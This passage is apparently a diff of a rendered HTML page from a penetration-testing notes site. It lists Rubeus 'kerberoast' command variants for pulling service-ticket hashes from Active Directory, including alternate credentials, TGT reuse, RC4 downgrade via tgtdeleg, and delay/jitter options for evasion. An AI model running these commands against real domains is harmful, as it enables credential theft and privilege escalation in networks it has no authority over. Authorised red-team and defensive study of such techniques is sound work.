-</span><span id="__span-9-36"><a id="__codelineno-9-36" name="__codelineno-9-36"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">stats</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
-</span><span id="__span-9-37"><a id="__codelineno-9-37" name="__codelineno-9-37"></a>
-</span><span id="__span-9-38"><a id="__codelineno-9-38" name="__codelineno-9-38"></a><span class="c"># Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):</span>
-</span><span id="__span-9-39"><a id="__codelineno-9-39" name="__codelineno-9-39"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">ldapfilter</span><span class="p">:</span><span class="s1">&#39;admincount=1&#39;</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
-</span><span id="__span-9-40"><a id="__codelineno-9-40" name="__codelineno-9-40"></a>
-</span><span id="__span-9-41"><a id="__codelineno-9-41" name="__codelineno-9-41"></a><span class="c"># Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:</span>
-</span><span id="__span-9-42"><a id="__codelineno-9-42" name="__codelineno-9-42"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">pwdsetafter</span><span class="p">:</span><span class="n">01</span><span class="p">-</span><span class="n">31</span><span class="p">-</span><span class="n">2005</span> <span class="p">/</span><span class="n">pwdsetbefore</span><span class="p">:</span><span class="n">03</span><span class="p">-</span><span class="n">29</span><span class="p">-</span><span class="n">2010</span> <span class="p">/</span><span class="n">resultlimit</span><span class="p">:</span><span class="n">5</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
-</span><span id="__span-9-43"><a id="__codelineno-9-43" name="__codelineno-9-43"></a>
-</span><span id="__span-9-44"><a id="__codelineno-9-44" name="__codelineno-9-44"></a><span class="c"># Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:</span>
-</span><span id="__span-9-45"><a id="__codelineno-9-45" name="__codelineno-9-45"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">delay</span><span class="p">:</span><span class="n">5000</span> <span class="p">/</span><span class="n">jitter</span><span class="p">:</span><span class="n">30</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
-</span><span id="__span-9-46"><a id="__codelineno-9-46" name="__codelineno-9-46"></a>
-</span><span id="__span-9-47"><a id="__codelineno-9-47" name="__codelineno-9-47"></a><span class="c"># Perform AES Kerberoasting:</span>
-</span><span id="__span-9-48"><a id="__codelineno-9-48" name="__codelineno-9-48"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">aes</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-12-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-12-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-12-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-12-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-12-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-12-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-12-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-12-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-12-10">10</a></span>
+<span class="normal"><a href="#__codelineno-12-11">11</a></span>
+<span class="normal"><a href="#__codelineno-12-12">12</a></span>
+<span class="normal"><a href="#__codelineno-12-13">13</a></span>
+<span class="normal"><a href="#__codelineno-12-14">14</a></span>
+<span class="normal"><a href="#__codelineno-12-15">15</a></span>
+<span class="normal"><a href="#__codelineno-12-16">16</a></span>
+<span class="normal"><a href="#__codelineno-12-17">17</a></span>
+<span class="normal"><a href="#__codelineno-12-18">18</a></span>
+<span class="normal"><a href="#__codelineno-12-19">19</a></span>
+<span class="normal"><a href="#__codelineno-12-20">20</a></span>
+<span class="normal"><a href="#__codelineno-12-21">21</a></span>
+<span class="normal"><a href="#__codelineno-12-22">22</a></span>
+<span class="normal"><a href="#__codelineno-12-23">23</a></span>
+<span class="normal"><a href="#__codelineno-12-24">24</a></span>
+<span class="normal"><a href="#__codelineno-12-25">25</a></span>
+<span class="normal"><a href="#__codelineno-12-26">26</a></span>
+<span class="normal"><a href="#__codelineno-12-27">27</a></span>
+<span class="normal"><a href="#__codelineno-12-28">28</a></span>
+<span class="normal"><a href="#__codelineno-12-29">29</a></span>
+<span class="normal"><a href="#__codelineno-12-30">30</a></span>
+<span class="normal"><a href="#__codelineno-12-31">31</a></span>
+<span class="normal"><a href="#__codelineno-12-32">32</a></span>
+<span class="normal"><a href="#__codelineno-12-33">33</a></span>
+<span class="normal"><a href="#__codelineno-12-34">34</a></span>
+<span class="normal"><a href="#__codelineno-12-35">35</a></span>
+<span class="normal"><a href="#__codelineno-12-36">36</a></span>
+<span class="normal"><a href="#__codelineno-12-37">37</a></span>
+<span class="normal"><a href="#__codelineno-12-38">38</a></span>
+<span class="normal"><a href="#__codelineno-12-39">39</a></span>
+<span class="normal"><a href="#__codelineno-12-40">40</a></span>
+<span class="normal"><a href="#__codelineno-12-41">41</a></span>
+<span class="normal"><a href="#__codelineno-12-42">42</a></span>
+<span class="normal"><a href="#__codelineno-12-43">43</a></span>
+<span class="normal"><a href="#__codelineno-12-44">44</a></span>
+<span class="normal"><a href="#__codelineno-12-45">45</a></span>
+<span class="normal"><a href="#__codelineno-12-46">46</a></span>
+<span class="normal"><a href="#__codelineno-12-47">47</a></span>
+<span class="normal"><a href="#__codelineno-12-48">48</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3"></a><span class="c"># Gather some stats:</span>
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4"></a> <span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">stats</span>
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5"></a>
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6"></a>
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7"></a><span class="c"># Perform Kerberoasting:</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">[[/</span><span class="n">spn</span><span class="p">:</span><span class="s2">&quot;blah/blah&quot;</span><span class="p">]</span> <span class="p">|</span> <span class="p">[/</span><span class="n">spns</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">spns</span><span class="p">.</span><span class="n">txt</span><span class="p">]]</span> <span class="p">[/</span><span class="n">user</span><span class="p">:</span><span class="n">USER</span><span class="p">]</span> <span class="p">[/</span><span class="n">domain</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">]</span> <span class="p">[/</span><span class="n">dc</span><span class="p">:</span><span class="n">DOMAIN_CONTROLLER</span><span class="p">]</span> <span class="p">[/</span><span class="n">ou</span><span class="p">:</span><span class="s2">&quot;OU=,...&quot;</span><span class="p">]</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
+</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9"></a>
+</span><span id="__span-12-10"><a id="__codelineno-12-10" name="__codelineno-12-10"></a><span class="c"># Perform Kerberoasting, outputting hashes to a file:</span>
+</span><span id="__span-12-11"><a id="__codelineno-12-11" name="__codelineno-12-11"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">outfile</span><span class="p">:</span><span class="n">hashes</span><span class="p">.</span><span class="n">txt</span> <span class="p">[[/</span><span class="n">spn</span><span class="p">:</span><span class="s2">&quot;blah/blah&quot;</span><span class="p">]</span> <span class="p">|</span> <span class="p">[/</span><span class="n">spns</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">spns</span><span class="p">.</span><span class="n">txt</span><span class="p">]]</span> <span class="p">[/</span><span class="n">user</span><span class="p">:</span><span class="n">USER</span><span class="p">]</span> <span class="p">[/</span><span class="n">domain</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">]</span> <span class="p">[/</span><span class="n">dc</span><span class="p">:</span><span class="n">DOMAIN_CONTROLLER</span><span class="p">]</span> <span class="p">[/</span><span class="n">ou</span><span class="p">:</span><span class="s2">&quot;OU=,...&quot;</span><span class="p">]</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span>
+</span><span id="__span-12-12"><a id="__codelineno-12-12" name="__codelineno-12-12"></a>
+</span><span id="__span-12-13"><a id="__codelineno-12-13" name="__codelineno-12-13"></a>
+</span><span id="__span-12-14"><a id="__codelineno-12-14" name="__codelineno-12-14"></a><span class="c"># Perform Kerberoasting, outputting hashes in the file output format, but to the console:</span>
+</span><span id="__span-12-15"><a id="__codelineno-12-15" name="__codelineno-12-15"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">simple</span> <span class="p">[[/</span><span class="n">spn</span><span class="p">:</span><span class="s2">&quot;blah/blah&quot;</span><span class="p">]</span> <span class="p">|</span> <span class="p">[/</span><span class="n">spns</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">spns</span><span class="p">.</span><span class="n">txt</span><span class="p">]]</span> <span class="p">[/</span><span class="n">user</span><span class="p">:</span><span class="n">USER</span><span class="p">]</span> <span class="p">[/</span><span class="n">domain</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">]</span> <span class="p">[/</span><span class="n">dc</span><span class="p">:</span><span class="n">DOMAIN_CONTROLLER</span><span class="p">]</span> <span class="p">[/</span><span class="n">ou</span><span class="p">:</span><span class="s2">&quot;OU=,...&quot;</span><span class="p">]</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
+</span><span id="__span-12-16"><a id="__codelineno-12-16" name="__codelineno-12-16"></a>
+</span><span id="__span-12-17"><a id="__codelineno-12-17" name="__codelineno-12-17"></a><span class="c"># Perform Kerberoasting with alternate credentials:</span>
+</span><span id="__span-12-18"><a id="__codelineno-12-18" name="__codelineno-12-18"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">creduser</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">.</span><span class="n">FQDN</span><span class="p">\</span><span class="n">USER</span> <span class="p">/</span><span class="n">credpassword</span><span class="p">:</span><span class="n">PASSWORD</span> <span class="p">[/</span><span class="n">spn</span><span class="p">:</span><span class="s2">&quot;blah/blah&quot;</span><span class="p">]</span> <span class="p">[/</span><span class="n">user</span><span class="p">:</span><span class="n">USER</span><span class="p">]</span> <span class="p">[/</span><span class="n">domain</span><span class="p">:</span><span class="n">DOMAIN</span><span class="p">]</span> <span class="p">[/</span><span class="n">dc</span><span class="p">:</span><span class="n">DOMAIN_CONTROLLER</span><span class="p">]</span> <span class="p">[/</span><span class="n">ou</span><span class="p">:</span><span class="s2">&quot;OU=,...&quot;</span><span class="p">]</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
+</span><span id="__span-12-19"><a id="__codelineno-12-19" name="__codelineno-12-19"></a>
+</span><span id="__span-12-20"><a id="__codelineno-12-20" name="__codelineno-12-20"></a><span class="c"># Perform Kerberoasting with an existing TGT:</span>
+</span><span id="__span-12-21"><a id="__codelineno-12-21" name="__codelineno-12-21"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">&lt;/</span><span class="n">spn</span><span class="p">:</span><span class="s2">&quot;blah/blah&quot;</span> <span class="p">|</span> <span class="p">/</span><span class="n">spns</span><span class="p">:</span><span class="n">C</span><span class="p">:\</span><span class="n">temp</span><span class="p">\</span><span class="n">spns</span><span class="p">.</span><span class="n">txt</span><span class="p">&gt;</span> <span class="p">&lt;/</span><span class="n">ticket</span><span class="p">:</span><span class="n">BASE64</span> <span class="p">|</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">FILE</span><span class="p">.</span><span class="n">KIRBI</span><span class="p">&gt;</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
+</span><span id="__span-12-22"><a id="__codelineno-12-22" name="__codelineno-12-22"></a>
+</span><span id="__span-12-23"><a id="__codelineno-12-23" name="__codelineno-12-23"></a><span class="c"># Perform Kerberoasting with an existing TGT using an enterprise principal:</span>
+</span><span id="__span-12-24"><a id="__codelineno-12-24" name="__codelineno-12-24"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">&lt;/</span><span class="n">spn</span><span class="p">:</span><span class="n">user</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span> <span class="p">|</span> <span class="p">/</span><span class="n">spns</span><span class="p">:</span><span class="n">user1</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span><span class="p">,</span><span class="n">user2</span><span class="nv">@domain</span><span class="p">.</span><span class="n">com</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">enterprise</span> <span class="p">&lt;/</span><span class="n">ticket</span><span class="p">:</span><span class="n">BASE64</span> <span class="p">|</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">FILE</span><span class="p">.</span><span class="n">KIRBI</span><span class="p">&gt;</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
+</span><span id="__span-12-25"><a id="__codelineno-12-25" name="__codelineno-12-25"></a>
+</span><span id="__span-12-26"><a id="__codelineno-12-26" name="__codelineno-12-26"></a><span class="c"># Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:</span>
+</span><span id="__span-12-27"><a id="__codelineno-12-27" name="__codelineno-12-27"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">&lt;/</span><span class="n">ticket</span><span class="p">:</span><span class="n">BASE64</span> <span class="p">|</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">FILE</span><span class="p">.</span><span class="n">KIRBI</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">autoenterprise</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
+</span><span id="__span-12-28"><a id="__codelineno-12-28" name="__codelineno-12-28"></a>
+</span><span id="__span-12-29"><a id="__codelineno-12-29" name="__codelineno-12-29"></a><span class="c"># Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:</span>
+</span><span id="__span-12-30"><a id="__codelineno-12-30" name="__codelineno-12-30"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">usetgtdeleg</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
+</span><span id="__span-12-31"><a id="__codelineno-12-31" name="__codelineno-12-31"></a>
+</span><span id="__span-12-32"><a id="__codelineno-12-32" name="__codelineno-12-32"></a><span class="c"># Perform &quot;opsec&quot; Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:</span>
+</span><span id="__span-12-33"><a id="__codelineno-12-33" name="__codelineno-12-33"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">rc4opsec</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
+</span><span id="__span-12-34"><a id="__codelineno-12-34" name="__codelineno-12-34"></a>
+</span><span id="__span-12-35"><a id="__codelineno-12-35" name="__codelineno-12-35"></a><span class="c"># List statistics about found Kerberoastable accounts without actually sending ticket requests:</span>
+</span><span id="__span-12-36"><a id="__codelineno-12-36" name="__codelineno-12-36"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">stats</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
+</span><span id="__span-12-37"><a id="__codelineno-12-37" name="__codelineno-12-37"></a>
+</span><span id="__span-12-38"><a id="__codelineno-12-38" name="__codelineno-12-38"></a><span class="c"># Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):</span>
+</span><span id="__span-12-39"><a id="__codelineno-12-39" name="__codelineno-12-39"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">ldapfilter</span><span class="p">:</span><span class="s1">&#39;admincount=1&#39;</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
+</span><span id="__span-12-40"><a id="__codelineno-12-40" name="__codelineno-12-40"></a>
+</span><span id="__span-12-41"><a id="__codelineno-12-41" name="__codelineno-12-41"></a><span class="c"># Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:</span>
+</span><span id="__span-12-42"><a id="__codelineno-12-42" name="__codelineno-12-42"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">pwdsetafter</span><span class="p">:</span><span class="n">01</span><span class="p">-</span><span class="n">31</span><span class="p">-</span><span class="n">2005</span> <span class="p">/</span><span class="n">pwdsetbefore</span><span class="p">:</span><span class="n">03</span><span class="p">-</span><span class="n">29</span><span class="p">-</span><span class="n">2010</span> <span class="p">/</span><span class="n">resultlimit</span><span class="p">:</span><span class="n">5</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
+</span><span id="__span-12-43"><a id="__codelineno-12-43" name="__codelineno-12-43"></a>
+</span><span id="__span-12-44"><a id="__codelineno-12-44" name="__codelineno-12-44"></a><span class="c"># Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:</span>
+</span><span id="__span-12-45"><a id="__codelineno-12-45" name="__codelineno-12-45"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">delay</span><span class="p">:</span><span class="n">5000</span> <span class="p">/</span><span class="n">jitter</span><span class="p">:</span><span class="n">30</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
+</span><span id="__span-12-46"><a id="__codelineno-12-46" name="__codelineno-12-46"></a>
+</span><span id="__span-12-47"><a id="__codelineno-12-47" name="__codelineno-12-47"></a><span class="c"># Perform AES Kerberoasting:</span>
+</span><span id="__span-12-48"><a id="__codelineno-12-48" name="__codelineno-12-48"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">kerberoast</span> <span class="p">/</span><span class="n">aes</span> <span class="p">[/</span><span class="n">ldaps</span><span class="p">]</span> <span class="p">[/</span><span class="n">nowrap</span><span class="p">]</span>
 </span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="January 19, 2025 22:33:25 UTC"><span class="timeago" datetime="2025-01-19T22:33:25+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="January 19, 2025 22:33:25 UTC">2025-01-19</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago" title="January 5, 2026 15:32:57 UTC"><span class="timeago" datetime="2026-01-05T15:32:57+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date" title="January 5, 2026 15:32:57 UTC">2026-01-05</span></small></br>
 
 
     <small>Created: December 27, 2024 22:00:41</small>
